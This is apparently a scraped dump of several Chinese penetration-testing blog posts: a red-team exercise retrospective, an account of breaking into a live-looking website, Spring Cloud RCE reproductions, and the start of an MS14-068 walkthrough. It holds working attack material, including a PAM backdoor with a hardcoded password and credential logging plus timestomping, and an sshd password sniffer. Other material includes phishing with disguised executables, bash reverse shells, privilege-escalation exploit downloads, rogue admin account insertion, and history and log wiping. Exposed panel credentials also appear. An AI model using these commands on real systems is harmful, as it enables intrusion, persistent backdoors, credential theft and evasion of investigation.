2）情报搜集人员：负责情报侦察和信息搜集，搜集的内容包括但不限于目标系统的组织架构、IT 资产、敏感信息泄露、供应商信息等。 3）武器装备制造人员：负责漏洞挖掘及工具编写，是攻击队的核心战斗力量，不仅要能找到并利用漏洞，还要力求在不同环境下达到稳定、深入的漏洞利用。 4）打点实施人员：负责获取接入点，进行 Web 渗透等。找到薄弱环节后，利用漏洞或社工等方法，获取外网系统控制权限；之后寻找和内网连通的通道，建立据点（跳板）。 5）社工钓鱼人员：负责社工攻击。利用人的安全意识不足或安全能力不足等弱点，实施社会工程学攻击，通过钓鱼邮件或社交平台等进行诱骗，进而打入内网。 6）内网渗透人员：负责进入内网后的横向拓展。利用情报搜集人员的情报结合其他弱点来进行横向拓展，扩大战果。尝试突破核心系统权限，控制核心任务，获取核心数据，最终完成目标突破工作。\n红队工作对人员的能力要求往往是综合性的、全面的，红队人员不仅要会熟练使用各种黑客工具、分析工具，还要熟知目标系统及其安全配置，并具备一定的代码开发能力，以便应对特殊问题。\n1.2 工具准备 根据自己的定位准备对应的工具，例如内网需要准备的东西：\n1.工具：域前置、跳板机、免杀马儿、获取凭据的工具、隧道工具、扫描工具、横向移动工具、其他工具等等。。。。\n2.知识点：代理(一层、多层)，获取各种凭据(工具和手动)，常见内网横向的方法、vcenter 相关、域渗透、域相关(拿下域控之后如何横向)\n防溯源：\n1.干净的信息，例如：邮箱用临时的、手机号码可以接码或者购买阿里小号、和多号、沃小号(目前阿里小号没号，可以尝试和多号和沃小号)、域名、服务器等\n代理池:\n白嫖\nprotocol==\u0026quot;socks5\u0026quot; \u0026amp;\u0026amp; \u0026quot;Version:5 Method:No Authentication(0x00)\u0026quot; \u0026amp;\u0026amp; after=\u0026quot;2022-03-01\u0026quot; \u0026amp;\u0026amp; country=\u0026quot;CN\u0026quot;\rhttps://github.com/akkuman/rotateproxy\r 自己用服务器搭建socks代理\n花钱飞鱼代理：https://www.feiyuip.com/user/about.html\n0x02 外网信息收集 信息收集主要目标系统的网络架构、IT 资产、敏感信息、组织管理与供应商等方面进行的情报搜集。目的在于帮助红队在攻击过程中快速定位薄弱点和采取正确的攻击路径，并为后两个阶段的工作提供针对性的建议，从而提高蓝队攻击工作效率和渗透成功率。比如：掌握了目标企业的相关人员信息和组织架构，就可以快速定位关键人物以便实施鱼叉攻击，或者确定内网横纵向渗透路径；而收集了 IT 资产信息，就可以为漏洞发现和利用提供数据支撑；掌握企业与供应商合作的相关信息，可为有针对性地开展供应链攻击提供素材。而究竟是要社工钓鱼，还是直接利用漏洞攻击或从供应链下手，一般取决于安全防护的薄弱环节究竟在哪里，以及红队对攻击路径的选择。\n​\n2.1案例 主要对一级单位、二级单位和三级单位的资产进行收集，利用天眼查、企查查、爱企查、小蓝本查询公司组织股权结构、app、公众号等信息，利用空间引擎进行搜索图标的 hash、证书信息、域名、IP、C 段等，针对 web 资产进行全端口扫描、目录扫描、指纹信息等，还有一些邮箱等。\n组织架构信息(公司官网查看)\n0x03 外网打点/钓鱼/近源攻击 3.1 外网打点 将整理好的资产进行分类，针对不同的应用进行攻击，尝试一些历史漏洞，弱口令等，进入后台之后查看配置文件，有几率会发现外网的数据库和阿里云的 key 等信息\n案例 1 通过弱口令登录后台，发现存在阿里云的 key\n使用阿里云 key 的利用工具，成功托管该账号的云服务，可直接执行命令，拿下主机。\n案例 2 通过越权获取配置文件\n可连接到数据库\n案例 3 登录到系统之后可能会发现一些企业微信的 key，可获取信息也用来钓鱼\n3.2 钓鱼 在红队的工作中，往往长时间的外网打点也无法打到一个据点，钓鱼是最快速的攻击手段，根据场景定制不同的钓鱼方法会有意想不到的惊喜。\n注意：钓鱼最重要的就是马儿，马儿一定要提前做好免杀，常用方法：分离免杀、白加黑等\n案例 1-招标网站钓鱼 在招标网站上，给工作人员发送投标文件\n成功上线一台主机\n案例 2-脉脉钓鱼 在脉脉上找到目标单位的人员，伪造猎头身份，向目标单位人员推荐有吸引力的工作岗位并添加微信，通过微信将恶意文件发送给目标人员(接码平台接码，新用户 1 毛开会员)\n制作一份伪装成视频文件的恶意程序。程序特点：免杀，超长文件名（中文 + 英文），exe 格式结尾。双击后会打开带有内容的视频文件并上线 CS。超长文件名是为了查看文件时让用户无法发现后缀。将恶意程序打成压缩包并添加密码。\n案例 3-伪造通知 通过伪造 xxx 通知，发送带有恶意文件的程序\n​\n团队使用的是 cs，使用批量发送的邮件的时候要考虑一个问题，当有许多机器上线的时候，需要及时的收到主机上线通知和快速的权限维持\n上线通知：使用 cs 插件，有新的主机上线推送到钉钉。\n快速权限维持：使用 cs 插件，可以参考：wgpsec 师傅的插件(地址：https://github.com/wgpsec/Automatic-permission-maintenance)，如果目标环境上存在 360 杀毒要考虑将进程注入白名单进程，否则运行计划任务时 360 会提示。\n3.3 近源攻击 近源攻击现在也是比较常见的方式了，常见的手法有以下几种：\n WIFI 钓鱼，比如大菠萝等设备 直接插网线  案例 由于在攻防演练在甲方单位，相对于进入比较方便一些\n提前获取了部分信息：部门 wifi 密码、上网认证的用户名密码\n找了个存在 wifi 的地方，通过以上信息连接了 wifi，内网四通八达，fscan 一波猛扫，发现一些漏洞，通过日下 vcenter 成功获取域控(口子不能过夜)\n0x04 内网渗透 进入内网之后需要横向拓展，当攻破某台内网终端或主机设备后，以此为基础，对相同网络环境中的其他设备发起的攻击活动；红队的内网横向拓展主要是指在突破进入目标网络内网以后，在内网主机、系统应用、服务器和网络设备等网络资产之间的跳转、控制、渗透过程\n​\n4.1 护网横向移动优先攻击策略 目内网往往非常大，快速定位和找到关键节点是非常重要的，选择的主要原则为:\n 快速掌握目标网络架构、网络设备及集权系统(堡垒机,运维管理机,性能监控系统,集中管控系统,域控等) 查找配置文件、系统日志、建设方案、wiki(在 wiki 中可能会存在网络架构图)、托管代码等、获取敏感信息，为拿下核心设备打下基础。  例如 confluence 中存公司整体拓扑、地址范围等。\n4.2 基本操作 做好权限维持之后进行信息收集，主要分为以下几步。\n1.收集目标机器上安装了哪些软件、存在哪些进程，通过进程查看存在哪些杀毒软件、软件等。\n2.使用 HackBrowserData 抓取浏览器的一些信息，例如浏览器历史记录、cookie、保存的账号密码(在使用过程中发现 360 安全浏览器是抓不到密码的)等，一般情况下能抓到系统的密码\n3.翻文件，说不定会存在一些密码文档,例如 xxx 系统的密码，发现内网的一些网段。\n4.在条件允许的情况下可将目标主机开启双用户登录，打通隧道，这样就可以白天操作了，也可以使用 todek 等工具，上传到目标机器上，直接操作目标主机\n5.在扫描其他网段的时候，只扫描.1、.2、.254 这几个地址，这样可以快速的知道哪几个网段存活，避免盲目扫描。通过 tracert 命令跟踪路由，说不定会有小惊喜。\n6.拿下内网中的 nas、云盘等信息，在 nas 系统中搜索“系统、管理”等词汇，会有意想不到的惊喜\n4.3 linux 抓密码 4.3.1 利用strace抓密码 当我们拿下 windows 机器时可以通过抓内存中的密码进行横向，但 linux 却不可能抓到内存中的密码，但是 Debian 系列下的 linux 系统可以通过监听 sshd 进程的数据抓取出明文密码，比如你拿下了一台管理员机器，上面有 xshell，你可以手动开一个监听，在开一个登录，监听的窗口上就抓出密码了\nstrace -xx -fp `cat /var/run/sshd.pid` 2\u0026gt;\u0026amp;1| grep --line-buffered -P 'write\\(\\d, \u0026quot;\\\\x00' | perl -lne '$|++; @F=/\u0026quot;\\s*([^\u0026quot;]+)\\s*\u0026quot;/g;for (@F){tr/\\\\x//d}; print for @F'|grep --line-buffered -oP '.{8}\\K([2-7][0-9a-f])*$'|grep --line-buffered -v '^64$'|perl -pe 's/([0-9a-f]{2})/chr hex $1/gie'\r 当然你也可以直接用工具抓 xshell 存的密码\n4.3.2 Linux Pam后门 PAM是一种认证模块，PAM可以作为Linux登录验证和各类基础服务的认证，简单来说就是一种用于Linux系统上的用户身份验证的机制。进行认证时首先确定是什么服务，然后加载相应的PAM的配置文件(位于**/etc/pam.d**)，最后调用认证文件(位于**/lib/security**)进行安全认证\n简易利用的PAM后门也是通过修改PAM源码中认证的逻辑来达到权限维持\n源码：http://www.linux-pam.org/library/\n查询版本：rpm -qa | grep pam\ntar -xzvf Linux-PAM-1.1.1.tar.gz\rcd Linux-PAM-1.1.1\r pam_unix_auth.c 修改认证逻辑，改成使用特定密码的后门，当然也可以作为一个记录敏感密码的功能，将记录的密码写入文件记录。\nsed -i -e 's/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\\n\\tif (strcmp(p,\u0026quot;'snsn123123'\u0026quot;)==0 ){retval = PAM_SUCCESS;}if(retval == PAM_SUCCESS){\\n\\tFILE * fp;\\n\\tfp = fopen(\u0026quot;/tmp/.sshd\u0026quot;, \u0026quot;a\u0026quot;);\\n\\tfprintf(fp, \u0026quot;%s : %s\\\\n\u0026quot;, name, p);\\n\\tfclose(fp);\\n\\t}/g' modules/pam_unix/pam_unix_auth.c\r ./configure \u0026amp;\u0026amp; make\r cp -rf /usr/lib64/security/pam_unix.so /usr/lib64/security/pam_unix.so.bak\rcp -rf pam_unix.so /usr/lib64/security/pam_unix.so\r oldtime=`stat -c '%z' /lib64/security/pam_ftp.so`\rtouch -d \u0026quot;$oldtime\u0026quot; /usr/lib64/security/pam_unix.so\r 当管理员登录之后就会有新的密码写入\n通过万能密码也可以成功登陆服务器\n4.4 域渗透 进入域之后为了获取最大的权限，通常想方设法将获取域控的权限，以下列举几种不同的攻击手法\n4.4.1 域漏洞 ms14-068\rzerologon(CVE-2020-1472)\rCVE-2021-1675(Windows Print Spooler)\rsAMAccountName spoofing(CVE-2021-42278、CVE-2021-42287)\rADCS(CVE-2022–26923)\r权限配置不当:ACL\r组策略GPP和SYSVOL中的密码\r基于委派的测试(约束委派、非约束委派、资源委派)\rRelay（中继）\rExchange、WSUS、DNS\rBackup Operators组成员权限到域控权限\r....等等等\r 4.5 vcenter 在攻防演练中vcenter作为一个运维集群管控系统，作为一个攻击人员想要在红方演练中快速刷分，Vcenter的价值不亚于域控的价值。\n4.5.1 常见漏洞 CVE-2021-21972\rCVE-2021-21985\rCVE-2021-22005\rprovider-logo SSRF 漏洞\rlog4j2 JNDI 注入\r 通过漏洞拿下vcenter之后，一般情况下是vsphere-ui权限，那就需要通过漏洞获取到root权限，常用提权方法如下。\n4.5.2 提权 CVE-2021-22015 本地提权\rCVE-2021-3156 本地提权\r 4.5.3 后渗透 4.5.3.1 SAML 证书登录 Sphere 5.0 版本引入了 SSO，支持使用 SAML 作为授权服务支持。当用户登录服务时，该服务会将身份验证请求转发给 SAML 。SAML 验证用户凭据是否正确以及他们是否有权访问指定的服务。\n在 vCenter 中从 /storage/db/vmware-vmdir/data.mdb 提取 ldap证书，为管理员用户创建 SAML 请求，最后使用 vCenter server 进行身份验证并获得有效的管理员 cookie。\n首先需要从 vCenter 获得数据库文件：\n Linux：/storage/db/vmware-vmdir/data.mdb Windows：C:\\ProgramData\\VMware\\vCenterServer\\data\\vmdird\\data.mdb  使用SAML脚本解密\n登录 vcenter后台，访问 https://IP/，添加cookie，修改完成之后，点击页面的启动。\n4.5.3.2 vhost_password_decrypt 查看数据库密码\ncat /etc/vmware-vpx/vcdb.properties /etc/vmware/service-state/vpxd/vcdb.properties\r 导出连接数据库\npsql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c \u0026quot;select ip_address,user_name,password from vpx_host;\u0026quot; \u0026gt; password.enc\r 将password.enc导出到本地，运行脚本解密\n解出来之后直接登录ex\n4.6 清理痕迹 上传的工具、马儿、扫描记录等等等，有关你的一切都删除，来也匆匆去也匆匆\n0x05 附录 这里只是列举了部分工具，工具太多，每个人的习惯也不同\n信息收集 ShuiZe 一条龙服务，只需要输入根域名即可全方位收集相关资产，并检测漏洞。也可以输入多个域名、C 段 IP 等，具体案例见下文。\nhttps://github.com/0x727/ShuiZe\\_0x727\r ARL 基于斗象灯塔 ARL 修改后的版本。相比原版，增加了 OneForAll、中央数据库，修改了 altDns\nhttps://github.com/ki9mu/ARL-plus-docker\r ENScan_GO ‘一款基于各大企业信息 API 的工具\nhttps://github.com/wgpsec/ENScan_GO\r fofa_viewer 一个简单实用的 FOFA 客户端 By flashine\nhttps://github.com/wgpsec/fofa_viewer\r 空间搜索引擎 https://hunter.qianxin.com/\rhttps://fofa.info/\rhttps://www.shodan.io/\rhttps://www.zoomeye.org/\rhttps://quake.360.cn/\rhttps://www.00sec.com/\r 指纹识别 https://github.com/EdgeSecurityTeam/EHole\rhttps://github.com/EASY233/Finger\r 端口扫描 https://github.com/lcvvvv/gonmap\rhttps://github.com/shadow1ng/fscan\r 漏洞扫描工具 https://github.com/chaitin/xray\rhttps://github.com/zhzyker/vulmap\rhttps://github.com/projectdiscovery/nuclei\rawvs使用docker一键搭建\r 漏洞利用 AK 资源管理工具 https://github.com/wyzxxz/aksk_tool\rhttps://github.com/teamssix/cf\r 数据库利用工具 https://github.com/SafeGroceryStore/MDUT\rhttps://github.com/uknowsec/SharpSQLTools\rnavicat\rhttps://github.com/yuyan-sec/RedisEXP\r 爆破利用工具 https://github.com/shack2/SNETCracker\r shell https://github.com/BeichenDream/Godzilla\rhttps://github.com/rebeyond/Behinder\rhttps://github.com/AntSwordProject/antSword\r菜刀\r 密码提取工具 Xshell，Xftp密码解密工具\rhttps://github.com/JDArmy/SharpXDecrypt\r解密浏览器数据（密码|历史记录|Cookie|书签 | 信用卡 | 下载记录）的导出工具，支持全平台主流浏览器\rhttps://github.com/moonD4rk/HackBrowserData/\r 隧道代理工具 proxychain\rsockscap64 (https://www.mediafire.com/folder/32rj1769a2w82/v4.7)\rproxifier (https://www.proxifier.com/download/ProxifierSetup.exe)\rhttps://github.com/fatedier/frp\rhttps://github.com/ehang-io/nps\rhttps://github.com/ph4ntonn/Stowaway\rhttps://github.com/Dliv3/Venom\rhttps://github.com/editso/fuso(相对冷门，不会被杀)\r 横向 impacket套件\r ","id":2,"section":"posts","summary":"0x01 前言 红队的攻击是一项系统的工作，整个攻击过程是有章可循、科学合理的，涵盖了从前期准备、攻击实施到靶标控制的各个步骤和环节。按照任务进度划分","tags":["攻防演练"],"title":"攻防演练复盘","uri":"https://ad-calcium.github.io/2022/08/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E5%A4%8D%E7%9B%98/","year":"2022"},{"content":"0x01 SQL注入 通过dirsearch进行目录扫描\n发现一个用户后台\n发现存在一个管理后台\n一堆常规操作，发现在账号处存在SQL注入\nSQLMAP一把梭哈\npython C:\\Tools\\sqlmap\\sqlmap.py -r C:\\Users\\admin\\xxx.req --force-ssl --risk=3 --level=3 --batch\r 当前数据库：wx_vdouya_cn\n| draw_edit |\r| draw_list |\r| draw_root |\r| draw_set |\r| draw_user |\r 获取draw_root表中的数据\npython C:\\Tools\\sqlmap\\sqlmap.py -r C:\\Users\\admin\\xxx.req --force-ssl --risk=3 --level=3 --batch -D wx_vdouya_cn -T draw_root --dump\r 可破解出md5的密码\n可成功登陆后台\n在后台这里还有一个接口存在注入\nhttps://IP/adminroot/center.php?username=xxx\n后台的功能点少得可怜，再次注入找个用户登录一下\npython C:\\Tools\\sqlmap\\sqlmap.py -r C:\\Users\\admin\\xxx.req --force-ssl --risk=3 --level=3 --batch -D wx_vdouya_cn -T draw_user --dump\r 用户的用户名密码\nqixi：qixi\r 0X02 文件上传 通过上述图片上的任意一个接口均可上传webshell，抓包修改以下两处，即可上传webshell\n拼接最后的webshell地址：https://IP/am/upload/2205/62769b6134fa6.php，通过蚁剑进行连接\n网站路径：/www/wwwroot/XXXXX\n上传路径：/www/wwwroot/XXXXX/am/upload/2205/\n查找数据库的连接信息\nmysql://XXXXX:XXXX@127.0.0.1:3306/XXXXX\r 无法执行命令\n0x03 绕过disable_functions 通过phpinfo查看禁用的函数\npassthru,exec,system,putenv,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv\r 过滤得还挺多的，发现有fpm，再看看当前收集到的信息，服务器是Linux的,服务器中的PHP是用FPM/FastCGI的连接模式启动，当前目录可写\n这里直接使用蚁剑的bypass_disable_functions的插件\n其实该方法的原理大致就是：php 是一门动态语言，但nginx 是无法处理这些的，所以中间还有个fastcgi 协议在牵线搭桥，可类比HTTP 协议，nginx 将接受到的客户端请求转换成 fastcgi 协议格式的数据，而 php 模块中的php-fpm 就是用来处理这些 fastcgi 协议数据的，然后再传给 php 解释器去处理，完成后结果数据又以之前同样的路径返回到浏览器客户端；所以一般在 Linux 服务器上启动 php 程序，都会启动一个叫 php-fpm 的服务，一般会监听本机的9000 端口，或者套接字文件，nginx 的配置文件 fastcgi 访问地址也配成这个端口或文件，这些都是为了完成上述通信过程；程；\n根据插件的信息，需要填写FPM/FCGI 地址、启动的WebServer根目录\n配置以下信息\n直接执行\n访问根当前目录下的下的.antproxy.php，密码不变\n成功执行命令\n直接反弹shell\n攻击机：\rnc -lvvp 8088\r目标机器：\rbash -i \u0026gt;\u0026amp; /dev/tcp/IP/8088 0\u0026gt;\u0026amp;1\rpython -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)'\r history和进程里没东西，那么还是隐藏一下命令痕迹先\nunset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0\r 查看内核版本\n0x04 提权 查看polkit版本\nrpm -qa polkit\r 发现是存在漏洞的版本，那就好办了，直接使用exp进行提权 https://github.com/arthepsy/CVE-2021-4034\nwget https://ghproxy.com/https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c\rgcc cve-2021-4034-poc.c -o cve-2021-4034-poc\r./cve-2021-4034-poc\r 由于使用了宝塔，拿到root权限之后，先查看一下宝塔的默认密码\nbt default\r Bt-Panel-URL: http://123.207.246.129:8889/28031524\rusername: zhouzhengyuan87\rpassword: XHPbayVI04fQ\r 也可以查看/www/server/panel/data查询网站的后台路径\n发现默认密码已经被修改了\n既然你无情就别怪我无意，都拿到了root权限，想登陆宝塔这不轻轻松松。有了后台，剩下的就是寻找密码了，宝塔后台账号密码默认存放在default.db数据库的users表中，将宝塔的default.db文件复制到可访问的路径\ncp /www/server/panel/data/default.db /tmp/xxxx\rchmod 7777 /tmp/xxxx\r 将default.db下载到本地，使用Navicat打开，在user表中找到用户的密码，不过密码是加盐的，md5是解不开了\nzhouzhengyuan87\r042be06ecc960bacb854661888bc6acd\r 直接新增一个用户，用SQL语句添加一个\nINSERT INTO \u0026quot;main\u0026quot;.\u0026quot;users\u0026quot; (\u0026quot;id\u0026quot;, \u0026quot;username\u0026quot;, \u0026quot;password\u0026quot;, \u0026quot;login_ip\u0026quot;, \u0026quot;login_time\u0026quot;, \u0026quot;phone\u0026quot;, \u0026quot;email\u0026quot;, \u0026quot;salt\u0026quot;) VALUES (1, 'txqosxze', '2796531e254a600c3a91a2d05e886846', '192.168.0.10', '2016-12-10 15:12:56', '0', 'test@message.com', '2YwPJFoXwQSr');\r 切记，一定要将原先的default.db文件进行备份，在将修改后的default.db文件替换掉\n成功使用新的用户名密码进行登录 用户名：txqosxze 密码：123456\n记得清理痕迹，由于我登录过宝塔，宝塔记录了我的登录记录，所以将logs目录下的日志都清除\ncd /www/server/panel/logs\recho \u0026gt; /www/server/panel/logs/access.log\recho \u0026gt; /www/server/panel/logs/certbot.log\recho \u0026gt; /www/server/panel/logs/error.log\recho \u0026gt; /www/server/panel/logs/ipfilter.log\recho \u0026gt; /www/server/panel/logs/ipfilter.pid\recho \u0026gt; /www/server/panel/logs/letsencrypt.log\recho \u0026gt; /www/server/panel/logs/panel.pid\recho \u0026gt; /www/server/panel/logs/request\recho \u0026gt; /www/server/panel/logs/task.log\recho \u0026gt; /www/server/panel/logs/task.pid\recho \u0026gt; /www/server/panel/logs/terminal.log\r 还有网站日志，毕竟你搞别人了，屁股要擦干净\ntail -n 20 xxxxx.log\rsed -i '/IP/d' /www/wwwlogs/xxxxxx.log\rsed -i '/IP/d' /www/wwwlogs/xxxxx.log\r 还有反弹shell，在进程中会存在，通过ps -aux查看进程，将反弹shell的进程、提权的进程都kill掉等等\n","id":3,"section":"posts","summary":"0x01 SQL注入 通过dirsearch进行目录扫描 发现一个用户后台 发现存在一个管理后台 一堆常规操作，发现在账号处存在SQL注入 SQLMAP一把梭","tags":["web安全"],"title":"一次平平无奇的渗透","uri":"https://ad-calcium.github.io/2022/05/%E4%B8%80%E6%AC%A1%E5%B9%B3%E5%B9%B3%E6%97%A0%E5%A5%87%E7%9A%84%E6%B8%97%E9%80%8F/","year":"2022"},{"content":"0x01 漏洞描述 Spring Cloud Function 是基于Spring Boot 的函数计算框架，通过对传输细节和基础架构进行抽象，为开发人员保留熟悉的开发工具和开发流程，使开发人员专注在实现业务逻辑上，从而提升开发效率。\n访问Spring Cloud Function的 HTTP请求头中存在 spring.cloud.function.routing-expression参数，其 SpEL表达式可进行注入攻击，并通过 StandardEvaluationContext解析执行。最终，攻击者可通过该漏洞进行远程命令执行。\n0x02 影响范围 3.0.0.RELEASE \u0026lt;= Spring Cloud Function \u0026lt;= 3.2.2 注：部分版本进行特定配置的动态路才会受该漏洞影响！  0x03 FOFA语法 app=\u0026quot;vmware-SpringBoot-framework\u0026quot;  0x04 漏洞搭建 docker run -d --name spring-cloud-functio -p 801:8080 --restart=always vulfocus/spring-cloud-function-rce  0x05 漏洞复现 验证漏洞 构造SpEL 注入 payload\nPOST /functionRouter HTTP/1.1 Host: 10.108.0.52:801 spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\u0026quot;ping -c 1 10.108.0.53\u0026quot;) Content-Length: 13 rec test1  这里使用tcpdump监听icmp流量，也可以使用dnslog\ntcpdump -nn -i ens192 icmp  反弹shell POST /functionRouter HTTP/1.1 Host: 10.108.0.52:801 spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\u0026quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMDguMC41My85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}\u0026quot;) Content-Length: 13 rec test1  0x06 参考文章 https://mp.weixin.qq.com/s/U7YJ3FttuWSOgCodVSqemg  ","id":4,"section":"posts","summary":"0x01 漏洞描述 Spring Cloud Function 是基于Spring Boot 的函数计算框架，通过对传输细节和基础架构进行抽象，为开发人员保留熟悉的开发工具和开发流程，使开发人员专注","tags":["漏洞复现","Spring"],"title":"Spring Cloud Function SPEL 远程命令执行漏洞","uri":"https://ad-calcium.github.io/2022/03/spring-cloud-function-spel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","year":"2022"},{"content":"0x01 介绍 Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式。\n0x02 漏洞描述 Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。\n0x03 漏洞影响 3.1.0、 3.0.0至3.0.6、 3.0.0之前的版本\n0x04 FOFA语言 app=\u0026quot;vmware-SpringBoot-framework\u0026quot;  0x05 漏洞环境搭建 docker-compose up -d  这里使用docker环境\nhttps://github.com/vulhub/vulhub/blob/master/spring/CVE-2022-22947  下载对应的环境，使用docker-compose快速构建\ndocker-compose up -d  搭建成功后访问http://IP:8080\n0x06 漏洞复现 网站是长这个样子的\n1.添加包含恶意的路由 发送如下数据包即可添加一个包含恶意SpEL表达式的路由：\nPOST /actuator/gateway/routes/WeianSec HTTP/1.1 Host: 10.108.0.52:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: close Accept-Language: en Content-Type: application/json Content-Length: 329 { \u0026quot;id\u0026quot;: \u0026quot;WeianSec\u0026quot;, \u0026quot;filters\u0026quot;: [{ \u0026quot;name\u0026quot;: \u0026quot;AddResponseHeader\u0026quot;, \u0026quot;args\u0026quot;: { \u0026quot;name\u0026quot;: \u0026quot;Result\u0026quot;, \u0026quot;value\u0026quot;: \u0026quot;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\u0026quot;id\\\u0026quot;}).getInputStream()))}\u0026quot; } }], \u0026quot;uri\u0026quot;: \u0026quot;http://example.com\u0026quot; }  2.刷新网关路由 然后，发送如下数据包应用刚添加的路由。这个数据包将触发SpEL表达式的执行：\nPOST /actuator/gateway/refresh HTTP/1.1 Host: 10.108.0.52:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: close Accept-Language: en Content-Type: application/json Content-Length: 523 Upgrade-Insecure-Requests=1\u0026amp;User-Agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F98.0.4758.102+Safari%2F537.36\u0026amp;Accept=text%2Fhtml%2Capplication%2Fxhtml%2Bxml%2Capplication%2Fxml%3Bq%3D0.9%2Cimage%2Favif%2Cimage%2Fwebp%2Cimage%2Fapng%2C%2A%2F%2A%3Bq%3D0.8%2Capplication%2Fsigned-exchange%3Bv%3Db3%3Bq%3D0.9\u0026amp;Accept-Encoding=gzip%2C+deflate\u0026amp;Accept-Language=zh-CN%2Czh%3Bq%3D0.9\u0026amp;Connection=close\u0026amp;Content-Type=application%2Fx-www-form-urlencoded\u0026amp;Content-Length=0  3.执行命令 发送如下数据包即可查看执行结果：\nGET /actuator/gateway/routes/WeianSec HTTP/1.1 Host: 10.108.0.52:8080 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.62 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Connection: close  4.脚本一键梭哈 python3 CVE-2022-22947.py -u http://10.108.0.52:8080 -x id  0x07 参考文章 https://github.com/vulhub/vulhub/blob/master/spring/CVE-2022-22947/README.zh-cn.md https://mp.weixin.qq.com/s/5ZBpVTofGpG_ssz2iPeI2A  ","id":5,"section":"posts","summary":"0x01 介绍 Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式。 0x02 漏洞描述 Spring Cloud Gateway是Spri","tags":["漏洞复现","Spring"],"title":"Spring Cloud Gateway 远程代码执行漏洞(CVE-2022-22947)","uri":"https://ad-calcium.github.io/2022/03/spring-cloud-gateway-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-22947/","year":"2022"},{"content":"0x01 漏洞详情 本场景中包含了域控和域用户, 通过登录域用户主机对域控进行攻击, 攻击成功后将域内任意用户权限提升至域管理级别, 从而获取整个域权限。\n0x02 虚拟机信息    节点名称 镜像名称 域用户 IP地址     域控 Windows 2008 administrator 192.168.15.251   域用户 Win7 liming 192.168.15.199    0x03 漏洞原理 用户在向 Kerberos 密钥分发中心（KDC）申请TGT（由票据授权服务产生的身份凭证）时，可以伪造自己的 Kerberos 票据。如果票据声明自己有域管理员权限，而KDC在处理该票据时未验证票据的签名，那么，返给用户的TGT就使普通域用户拥有了域管理员权限。该用户可以将TGT发送到KDC，KDC的TGS（票据授权服务）在验证了TGT后，将服务票据（Server Ticket）发送给该用户，而该用户拥有访问该服务的权限，从而使攻击者可以访问域内的资源。\n漏洞原因：\nA、在域中默认允许设置Include-pac的值为False（不能算漏洞，应该是微软对于某些特定场景的特殊考虑设计出的机制）。\nB、PAC中的数字签名可以由Client端指定，并且Key的值可以为空。\nC、PAC的加密方式也可以由Client指定，并且Key的值为generate_subkey函数生成的16位随机数。\nD、构造的PAC中包含高权限组的SID内容。\n也就是说通过这几点Client完全伪造了一个PAC发送给KDC，并且KDC通过Client端在请求中指定的加密算法来解密伪造的PAC以及校验数字签名，并验证通过。\n0x04 漏洞利用前提 1.域控没有打MS14-068的补丁\n2.攻击者拿下了一台域内的普通计算机,并获得普通域用户以及密码/hash值，以及用户的suid\n0x05 利用的工具 Ms14-068.exe 下载地址:https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068\rPSexec 下载地址:https://download.sysinternals.com/files/PSTools.zip\rmimikatz 下载地址:https://github.com/gentilkiwi/mimikatz/releases\r 0x06 漏洞复现 在命令行中输入whoami 查看当前用户\n查看用户的 SID 执行whoami /all获取sid将sid号复制下来。\n获取域控主机名\nnet group \u0026quot;domain controllers\u0026quot; /do\r 生成高权限票据 